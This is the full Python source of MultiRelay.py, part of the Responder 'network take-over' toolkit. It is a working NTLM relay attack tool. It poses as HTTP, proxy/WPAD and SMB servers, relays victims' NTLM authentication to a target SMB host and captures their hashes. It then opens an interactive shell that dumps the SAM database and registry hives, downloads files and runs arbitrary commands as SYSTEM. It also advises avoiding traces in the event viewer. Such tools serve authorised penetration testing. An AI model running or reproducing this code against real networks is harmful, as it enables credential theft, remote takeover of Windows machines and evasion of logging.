#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools 
# created and maintained by Laurent Gaffie.
# email: laurent.gaffie@gmail.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import sys
import re
import os
import logging
import optparse
import time
from threading import Thread
from SocketServer import TCPServer, UDPServer, ThreadingMixIn, BaseRequestHandler
try:
    from Crypto.Hash import MD5
except ImportError:
    print "\033[1;31m\nCrypto lib is not installed. You won't be able to live dump the hashes."
    print "You can install it on debian based os with this command: apt-get install python-crypto"
    print "The Sam file will be saved anyway and you will have the bootkey.\033[0m\n"

from MultiRelay.RelayMultiPackets import *
from MultiRelay.RelayMultiCore import *

from SMBFinger.Finger import RunFinger
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../')))
from socket import *

__version__ = "1.0"

def UserCallBack(op, value, dmy, parser):
    args=[]
    for arg in parser.rargs:
        if arg[0] != "-":
            args.append(arg)
    if getattr(parser.values, op.dest):
        args.extend(getattr(parser.values, op.dest))
    setattr(parser.values, op.dest, args)

parser = optparse.OptionParser(usage="python %prog -t10.20.30.40 -u Administrator lgandx admin", version=__version__, prog=sys.argv[0])
parser.add_option('-t',action="store", help="Target server for SMB relay.",metavar="10.20.30.45",dest="TARGET")
parser.add_option('-p',action="store", help="Additional port to listen on, this will relay for proxy, http and webdav incoming packets.",metavar="8081",dest="ExtraPort")
parser.add_option('-u', '--UserToRelay', action="callback", callback=UserCallBack, dest="UserToRelay")

options, args = parser.parse_args()

if options.TARGET is None:
    print "\n-t Mandatory option is missing, please provide a target.\n"
    parser.print_help()
    exit(-1)
if options.UserToRelay is None:
    print "\n-u Mandatory option is missing, please provide a username to relay.\n"
    parser.print_help()
    exit(-1)
if options.ExtraPort is None:
    options.ExtraPort = 0

ExtraPort = options.ExtraPort
UserToRelay = options.UserToRelay
Host = options.TARGET, 445
Cmd = []
ShellOpen = []

def color(txt, code = 1, modifier = 0):
	return "\033[%d;3%dm%s\033[0m" % (modifier, code, txt)

def ShowWelcome():
     print color('\nResponder MultiRelay to SMB NTLMv1/2',8,1)
     print color('Version: '+__version__,8,1)
     print '\nSend bugs/hugs/comments to: laurent.gaffie@gmail.com'
     print 'Usernames to relay (-u) are case sensitive.'
     print 'To kill this script hit CRTL-C.\n'
     print 'Use this script in combination with Responder.py for best results.'
     print 'This tool listen on TCP port 80, 3128 and 445.'
     print 'Make sure nothing use these ports.\n'
     print 'For optimal pwnage, launch Responder with only these 2 options:'
     print '-rv\nRunning psexec style commands can be noisy in the event viewer,'
     print 'if anyone ever reads it.. If you want to leave no trace in the'
     print 'event viewer, use Responder\'s built-in commands. They silently'
     print 'perform the tasks requested, including the hashdump command.'
     print color('\nRelaying credentials for these users:',8,1)
     print color(UserToRelay,4,1)
     print '\n'


ShowWelcome()

def ShowHelp():
     print color('Available commands:',8,0)
     print color('dump',8,1)+'               -> Extract the SAM database and print hashes.'
     print color('regdump KEY',8,1)+'        -> Dump an HKLM registry key (eg: regdump SYSTEM)'
     print color('read Path_To_File',8,1)+'  -> Read a file (eg: read /windows/win.ini)'
     print color('get  Path_To_File',8,1)+'  -> Download a file (eg: get users/administrator/desktop/password.txt)'
     print color('help',8,1)+'               -> Print this message.'
     print color('exit',8,1)+'               -> Exit this shell and return in relay mode.'
     print '                      If you want to quit type exit and then use CRTL-C\n'
     print color('Any other command than that will be run as SYSTEM on the target.\n',8,1)

Logs_Path = os.path.abspath(os.path.join(os.path.dirname(__file__)))+"/../"
Logs = logging
Logs.basicConfig(filemode="a",filename=Logs_Path+'logs/SMBRelay-Session.txt',level=logging.INFO, format='%(asctime)s - %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')

try:
    RunFinger(Host[0])
except:
    print "The host %s seems to be down or port 445 down."%(Host[0])
    sys.exit(1)


def get_command():
    global Cmd
    Cmd = []
    while any(x in Cmd for x in Cmd) is False:
       Cmd = [raw_input("C:\\Windows\\system32\\:#")]

#Function used to make sure no connections are accepted while we have an open shell.
#Used to avoid any possible broken pipe.
def IsShellOpen():
    #While there's nothing in our array return false.
    if any(x in ShellOpen for x in ShellOpen) is False:
       return False
    #If there is return True.
    else:
       return True

def ConnectToTarget():
        try:
            s = socket(AF_INET, SOCK_STREAM)
            #Override TCP keep-alives
            s.setsockopt(SOL_SOCKET, SO_KEEPALIVE, 1)
            s.setsockopt(IPPROTO_TCP, TCP_KEEPCNT, 15)
            s.setsockopt(IPPROTO_TCP, TCP_KEEPINTVL, 5)
            # macOS does not have TCP_KEEPIDLE
            if sys.platform != 'darwin':
                s.setsockopt(IPPROTO_TCP, TCP_KEEPIDLE, 5)
            s.connect(Host)  
            return s
        except:
            "Cannot connect to target, host down?"
            sys.exit(1)

class HTTPProxyRelay(BaseRequestHandler):
     
    def handle(self):

        try:
            #Don't handle requests while a shell is open. That's the goal after all.
            if IsShellOpen():
               return None
        except:
            raise

        s = ConnectToTarget()
        try:
            data = self.request.recv(8092)
            ##First we check if it's a Webdav OPTION request.
            Webdav = ServeOPTIONS(data)
            if Webdav:
                #If it is, send the option answer, we'll send him to auth when we receive a profind.
                self.request.send(Webdav)
                data = self.request.recv(4096)

            NTLM_Auth = re.findall(r'(?<=Authorization: NTLM )[^\r]*', data)
            ##Make sure incoming packet is an NTLM auth, if not send HTTP 407.
	    if NTLM_Auth:
                #Get NTLM Message code. (1:negotiate, 2:challenge, 3:auth)
	        Packet_NTLM = b64decode(''.join(NTLM_Auth))[8:9]

		if Packet_NTLM == "\x01":
                    ## SMB Block. Once we get an incoming NTLM request, we grab the ntlm challenge from the target.
                    h = SMBHeader(cmd="\x72",flag1="\x18", flag2="\x07\xc8")
                    n = SMBNegoCairo(Data = SMBNegoCairoData())
                    n.calculate()
                    packet0 = str(h)+str(n)
                    buffer0 = longueur(packet0)+packet0
                    s.send(buffer0)
                    smbdata = s.recv(2048)
                    ##Session Setup AndX Request, NTLMSSP_NEGOTIATE
                    if smbdata[8:10] == "\x72\x00":
                        head = SMBHeader(cmd="\x73",flag1="\x18", flag2="\x07\xc8",mid="\x02\x00")
                        t = SMBSessionSetupAndxNEGO(Data=b64decode(''.join(NTLM_Auth)))#
                        t.calculate() 
                        packet1 = str(head)+str(t)
                        buffer1 = longueur(packet1)+packet1  
                        s.send(buffer1)
                        smbdata = s.recv(2048) #got it here.
                        
                    ## Send HTTP Proxy
	            Buffer_Ans = WPAD_NTLM_Challenge_Ans()
		    Buffer_Ans.calculate(str(ExtractRawNTLMPacket(smbdata)))#Retrieve challenge message from smb
                    key = ExtractHTTPChallenge(smbdata)#Grab challenge key for later use (hash parsing).
		    self.request.send(str(Buffer_Ans)) #We send NTLM message 2 to the client.
                    data = self.request.recv(8092)
                    NTLM_Proxy_Auth = re.findall(r'(?<=Authorization: NTLM )[^\r]*', data)
                    Packet_NTLM = b64decode(''.join(NTLM_Proxy_Auth))[8:9]

                    ##Got NTLM Message 3 from client.
		    if Packet_NTLM == "\x03":
	                NTLM_Auth = b64decode(''.join(NTLM_Proxy_Auth))
                        ##Might be anonymous, verify it and if so, send no go to client.
                        if IsSMBAnonymous(NTLM_Auth):
                            Response = WPAD_Auth_407_Ans()
	                    self.request.send(str(Response))
                            data = self.request.recv(8092)
                        else:
                            #Let's send that NTLM auth message to ParseSMBHash which will make sure this user is allowed to login
                            #and has not attempted before. While at it, let's grab his hash.
                            Username, Domain = ParseHTTPHash(NTLM_Auth, key, self.client_address[0],UserToRelay,Host)

                            if Username is not None:
                                head = SMBHeader(cmd="\x73",flag1="\x18", flag2="\x07\xc8",uid=smbdata[32:34],mid="\x03\x00")
                                t = SMBSessionSetupAndxAUTH(Data=NTLM_Auth)#Final relay.
                                t.calculate()
                                packet1 = str(head)+str(t)
                                buffer1 = longueur(packet1)+packet1  
                                print "[+] SMB Session Auth sent."
                                s.send(buffer1)
                                smbdata = s.recv(2048)
   	                        RunCmd = RunShellCmd(smbdata, s, self.client_address[0], Host, Username, Domain)
                                if RunCmd is None:
                                    s.close()
                                    return None

	    else:
                ##Any other type of request, send a 407.
                Response = WPAD_Auth_407_Ans()
	        self.request.send(str(Response))

        except Exception:
	    self.request.close()
            ##No need to print anything (timeouts, rst, etc) to the user console..
	    pass


class HTTPRelay(BaseRequestHandler):
     
    def handle(self):

        try:
            #Don't handle requests while a shell is open. That's the goal after all.
            if IsShellOpen():
               return None
        except:
            raise

        try:
            s = ConnectToTarget()

            data = self.request.recv(8092)
            ##First we check if it's a Webdav OPTION request.
            Webdav = ServeOPTIONS(data)
            if Webdav:
                #If it is, send the option answer, we'll send him to auth when we receive a profind.
                self.request.send(Webdav)
                data = self.request.recv(4096)

            NTLM_Auth = re.findall(r'(?<=Authorization: NTLM )[^\r]*', data)
            ##Make sure incoming packet is an NTLM auth, if not send HTTP 407.
	    if NTLM_Auth:
                #Get NTLM Message code. (1:negotiate, 2:challenge, 3:auth)
	        Packet_NTLM = b64decode(''.join(NTLM_Auth))[8:9]

		if Packet_NTLM == "\x01":
                    ## SMB Block. Once we get an incoming NTLM request, we grab the ntlm challenge from the target.
                    h = SMBHeader(cmd="\x72",flag1="\x18", flag2="\x07\xc8")
                    n = SMBNegoCairo(Data = SMBNegoCairoData())
                    n.calculate()
                    packet0 = str(h)+str(n)
                    buffer0 = longueur(packet0)+packet0
                    s.send(buffer0)
                    smbdata = s.recv(2048)
                    ##Session Setup AndX Request, NTLMSSP_NEGOTIATE
                    if smbdata[8:10] == "\x72\x00":
                        head = SMBHeader(cmd="\x73",flag1="\x18", flag2="\x07\xc8",mid="\x02\x00")
                        t = SMBSessionSetupAndxNEGO(Data=b64decode(''.join(NTLM_Auth)))#
                        t.calculate() 
                        packet1 = str(head)+str(t)
                        buffer1 = longueur(packet1)+packet1  
                        s.send(buffer1)
                        smbdata = s.recv(2048) #got it here.
                        
                    ## Send HTTP Response.
	            Buffer_Ans = IIS_NTLM_Challenge_Ans()
		    Buffer_Ans.calculate(str(ExtractRawNTLMPacket(smbdata)))#Retrieve challenge message from smb
                    key = ExtractHTTPChallenge(smbdata)#Grab challenge key for later use (hash parsing).
		    self.request.send(str(Buffer_Ans)) #We send NTLM message 2 to the client.
                    data = self.request.recv(8092)
                    NTLM_Proxy_Auth = re.findall(r'(?<=Authorization: NTLM )[^\r]*', data)
                    Packet_NTLM = b64decode(''.join(NTLM_Proxy_Auth))[8:9]

                    ##Got NTLM Message 3 from client.
		    if Packet_NTLM == "\x03":
	                NTLM_Auth = b64decode(''.join(NTLM_Proxy_Auth))
                        ##Might be anonymous, verify it and if so, send no go to client.
                        if IsSMBAnonymous(NTLM_Auth):
                            Response = IIS_Auth_401_Ans()
	                    self.request.send(str(Response))
                            data = self.request.recv(8092)
                        else:
                            #Let's send that NTLM auth message to ParseSMBHash which will make sure this user is allowed to login
                            #and has not attempted before. While at it, let's grab his hash.
                            Username, Domain = ParseHTTPHash(NTLM_Auth, key, self.client_address[0],UserToRelay,Host)

                            if Username is not None:
                                head = SMBHeader(cmd="\x73",flag1="\x18", flag2="\x07\xc8",uid=smbdata[32:34],mid="\x03\x00")
                                t = SMBSessionSetupAndxAUTH(Data=NTLM_Auth)#Final relay.
                                t.calculate()
                                packet1 = str(head)+str(t)
                                buffer1 = longueur(packet1)+packet1  
                                print "[+] SMB Session Auth sent."
                                s.send(buffer1)
                                smbdata = s.recv(2048)
   	                        RunCmd = RunShellCmd(smbdata, s, self.client_address[0], Host, Username, Domain)
                                if RunCmd is None:
                                    s.close()
                                    return None

	    else:
                ##Any other type of request, send a 407.
                Response = IIS_Auth_401_Ans()
	        self.request.send(str(Response))


        except Exception:
	    self.request.close()
            ##No need to print anything (timeouts, rst, etc) to the user console..
	    pass

class SMBRelay(BaseRequestHandler):
     
    def handle(self):

        try:
            #Don't handle requests while a shell is open. That's the goal after all.
            if IsShellOpen():
               return None
        except:
            raise

        s = ConnectToTarget()

        try:
            data = self.request.recv(4096)

            ##Negotiate proto answer. That's us.
            if data[8:10] == "\x72\x00":
                head = SMBHeader(cmd="\x72",flag1="\x98", flag2="\x53\xc7", pid=pidcalc(data),mid=midcalc(data))
                t = SMBRelayNegoAns(Dialect=Parse_Nego_Dialect(data))
                packet1 = str(head)+str(t)
                buffer1 = longueur(packet1)+packet1
                self.request.send(buffer1)
                data = self.request.recv(4096)

            ## Make sure it's not a Kerberos auth.
            if data.find("NTLM") is not -1:
               ## Start with nego protocol + session setup negotiate to our target.
               data, smbdata, s, challenge = GrabNegotiateFromTarget(data, s)

            ## Make sure it's not a Kerberos auth.
            if data.find("NTLM") is not -1:
                ##Relay all that to our client.
                if data[8:10] == "\x73\x00":
                   head = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x53\xc8", errorcode="\x16\x00\x00\xc0", pid=pidcalc(data),mid=midcalc(data))
                   #NTLMv2 MIC calculation is a concat of all 3 NTLM (nego,challenge,auth) messages exchange.
                   #Then simply grab the whole session setup packet except the smb header from the client and pass it to the server.
                   t = smbdata[36:]
                   packet0 = str(head)+str(t)
                   buffer0 = longueur(packet0)+packet0
                   self.request.send(buffer0)
                   data = self.request.recv(4096)
            else:
               #if it's kerberos, ditch the connection.
               s.close()
               return None

            if IsSMBAnonymous(data):
                ##Send logon failure for anonymous logins.
                head = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x53\xc8", errorcode="\x6d\x00\x00\xc0", pid=pidcalc(data),mid=midcalc(data))
                t = SMBSessEmpty()
                packet1 = str(head)+str(t)
                buffer1 = longueur(packet1)+packet1
                self.request.send(buffer1)
                #data = self.request.recv(4096) ##Make him feel bad, ditch the connection.
                s.close()
                return None

            else:
                #Let's send that NTLM auth message to ParseSMBHash which will make sure this user is allowed to login
                #and has not attempted before. While at it, let's grab his hash.
                Username, Domain = ParseSMBHash(data,self.client_address[0],challenge,UserToRelay,Host)
                if Username is not None:
                    ##Got the ntlm message 3, send it over to SMB.
                    head = SMBHeader(cmd="\x73",flag1="\x18", flag2="\x07\xc8",uid=smbdata[32:34],mid="\x03\x00")
                    t = data[36:]#Final relay.
                    packet1 = str(head)+str(t)
                    buffer1 = longueur(packet1)+packet1  
                    print "[+] SMB Session Auth sent."
                    s.send(buffer1)
                    smbdata = s.recv(4096)
                    #We're all set, dropping into shell.
   	            RunCmd = RunShellCmd(smbdata, s, self.client_address[0], Host, Username, Domain)
                    #If runcmd is None it's because tree connect was denied for this user.
                    #This will only happen once with that specific user account. 
                    #Let's kill that connection so we can force him to reauth with another account.
                    if RunCmd is None:
                        s.close()
                        return None

                else:
                   ##Send logon failure, so our client might authenticate with another account.    
                   head = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x53\xc8", errorcode="\x6d\x00\x00\xc0", pid=pidcalc(data),mid=midcalc(data))
                   t = SMBSessEmpty()
                   packet1 = str(head)+str(t)
                   buffer1 = longueur(packet1)+packet1
                   self.request.send(buffer1)
                   data = self.request.recv(4096)
                   s.close()
                   return None

        except Exception:
            s.close()
	    self.request.close()
            ##No need to print anything (timeouts, rst, etc) to the user console..
	    pass


#Interface starts here.
def RunShellCmd(data, s, clientIP, Host, Username, Domain):
    # On this block we do some verifications before dropping the user into the shell.
    if data[8:10] == "\x73\x6d":
        print "[+] Relay failed, Logon Failure. This user doesn't have an account on this target."
        print "[+] Hashes were saved anyways in Responder/logs/ folder.\n"
        Logs.info(clientIP+":"+Username+":"+Domain+":"+Host[0]+":Logon Failure")
        return False

    if data[8:10] == "\x73\x8d":
        print "[+] Relay failed, STATUS_TRUSTED_RELATIONSHIP_FAILURE returned. Credentials are good, but user is probably not using the target domain name in his credentials.\n"
        Logs.info(clientIP+":"+Username+":"+Domain+":"+Host[0]+":Logon Failure")
        return False

    ## Ok, we are supposed to be authenticated here, so first check if user has admin privs on C$:    
    ## Tree Connect
    if data[8:10] == "\x73\x00":
        GetSessionResponseFlags(data)#While at it, verify if the target has returned a guest session.
        head = SMBHeader(cmd="\x75",flag1="\x18", flag2="\x07\xc8",mid="\x04\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
        t = SMBTreeConnectData(Path="\\\\"+Host[0]+"\\C$")
        t.calculate() 
        packet1 = str(head)+str(t)
        buffer1 = longueur(packet1)+packet1  
        s.send(buffer1)
        data = s.recv(2048)

    ## Nope he doesn't.
    if data[8:10] == "\x75\x22":
        print "[+] Relay Failed, Tree Connect AndX denied. This is a low privileged user or SMB Signing is mandatory.\n[+] Hashes were saved anyways in Responder/logs/ folder.\n"
        Logs.info(clientIP+":"+Username+":"+Domain+":"+Host[0]+":Logon Failure")
        return False
        return False

    # This one should not happen since we always use the IP address of the target in our tree connects, but just in case.. 
    if data[8:10] == "\x75\xcc":
        print "[+] Tree Connect AndX denied. Bad Network Name returned."
        return False

    ## Tree Connect on C$ is successfull.
    if data[8:10] == "\x75\x00":
        print "[+] Looks good, "+Username+" has admin rights on C$."
        head = SMBHeader(cmd="\x75",flag1="\x18", flag2="\x07\xc8",mid="\x04\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
        t = SMBTreeConnectData(Path="\\\\"+Host[0]+"\\IPC$")
        t.calculate() 
        packet1 = str(head)+str(t)
        buffer1 = longueur(packet1)+packet1  
        s.send(buffer1)
        data = s.recv(2048)

    ## Drop into the shell.
    if data[8:10] == "\x75\x00":
        print "[+] Authenticated.\n[+] Dropping into Responder's interactive shell, type \"exit\" to terminate\n"
        ShowHelp()
        #Make sure we don't open 2 shell at the same time..
        global ShellOpen
        ShellOpen = ["Shell is open"]

    while True:

        ## We either just arrived here or we're back from a command operation, let's setup some stuff.
        if data[8:10] == "\x75\x00":
            #start a thread for raw_input, so we can do other stuff while we wait for a command.
            t = Thread(target=get_command, args=())
            t.start()
            t.join()
            #For now, this is not functionning as expected. The SMB echos are killing the connection
            #way faster than if we let the connection time_wait (after 2 tree connect [1 IPC & 1 C$]) itself.
            #So let's use the tree connects wait (average time before timeout:5-12h)
            """
            while any(x in Cmd for x in Cmd) is False:
                SMBKeepAlive(s, data)
                time.sleep(20)
                pass
            """

            ##Grab the commands. Cmd is global in get_command().
            Read    = re.findall(r'(?<=read )[^\r]*', Cmd[0])
            RegDump = re.findall(r'(?<=regdump )[^\r]*', Cmd[0])
            Get     = re.findall(r'(?<=get )[^\r]*', Cmd[0])
            Help    = re.findall(r'(?<=help)[^\r]*', Cmd[0])

            if Cmd[0] == "exit":
               print "[+]Returning in relay mode."
               del Cmd[:]
               del ShellOpen[:]
               return None

            ##For all of the following commands we send the data (var:data) returned by the 
            ##tree connect IPC$ answer and the socket (var: s) to our operation function in RelayMultiCore. 
            ##We also clean up the command array when done.
            if Cmd[0] == "dump":
               data = DumpHashes(data, s, Host)
               del Cmd[:]

            if Read:
               File = Read[0]
               data = ReadFile(data, s, File, Host)
               del Cmd[:]

            if Get:
               File = Get[0]
               data = GetAfFile(data, s, File, Host)
               del Cmd[:]

            if RegDump:
               Key = RegDump[0]
               data = SaveAKey(data, s, Host, Key)
               del Cmd[:]

            if Help:
               ShowHelp()
               del Cmd[:]

            ##Let go with the command.
            if any(x in Cmd for x in Cmd):
                if len(Cmd[0]) > 1:
                   data = RunCmd(data, s, clientIP, Username, Domain, Cmd[0], Logs, Host)
                   del Cmd[:]

        if data is None:
           print "\033[1;31m\nSomething went wrong, the server dropped the connection.\nMake sure the server (\\Windows\\Temp\\) is clean\033[0m\n"

        if data[8:10] == "\x2d\x34":#We confirmed with OpenAndX that no file remains after the execution of the last command. We send a tree connect IPC and land at the begining of the command loop.  
            head = SMBHeader(cmd="\x75",flag1="\x18", flag2="\x07\xc8",mid="\x04\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
            t = SMBTreeConnectData(Path="\\\\"+Host[0]+"\\IPC$")#
            t.calculate() 
            packet1 = str(head)+str(t)
            buffer1 = longueur(packet1)+packet1  
            s.send(buffer1)
            data = s.recv(2048)

class ThreadingTCPServer(TCPServer):
     def server_bind(self):
          TCPServer.server_bind(self)

ThreadingTCPServer.allow_reuse_address = 1
ThreadingTCPServer.daemon_threads = True

def serve_thread_tcp(host, port, handler):
     try:
          server = ThreadingTCPServer((host, port), handler)
          server.serve_forever()
     except: 
          print color('Error starting TCP server on port '+str(port)+ ', check permissions or other servers running.', 1, 1)

def main():
     try:
          threads = []
          threads.append(Thread(target=serve_thread_tcp, args=('', 445, SMBRelay,)))
          threads.append(Thread(target=serve_thread_tcp, args=('', 3128, HTTPProxyRelay,)))
          threads.append(Thread(target=serve_thread_tcp, args=('', 80, HTTPRelay,)))
          if ExtraPort != 0:
             threads.append(Thread(target=serve_thread_tcp, args=('', int(ExtraPort), HTTPProxyRelay,)))
          for thread in threads:
               thread.setDaemon(True)
               thread.start()

          while True:
               time.sleep(1)

     except KeyboardInterrupt:
          sys.exit("\rExiting...")

if __name__ == '__main__':
     main()
